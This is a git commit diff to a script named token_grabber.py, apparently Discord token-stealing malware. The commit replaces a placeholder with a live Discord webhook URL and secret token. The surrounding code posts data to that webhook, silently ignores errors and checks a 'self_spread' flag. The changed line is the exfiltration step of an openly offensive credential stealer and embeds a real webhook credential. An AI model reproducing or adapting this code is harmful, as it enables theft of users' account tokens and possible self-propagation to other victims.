cb9d091c80971b0d626d63732ba2b725854ff885
RedxMime <105324123+RedxMime@users.noreply.github.com>
2022-12-01 20:16:23 -0600

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1048056872575442994/MOwzyMnjbYctv8Uc4eZSBkfVm5igxRbKjPMX9XqGROVLDnR4YWDGEx74vyUPTrVe8lyk", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
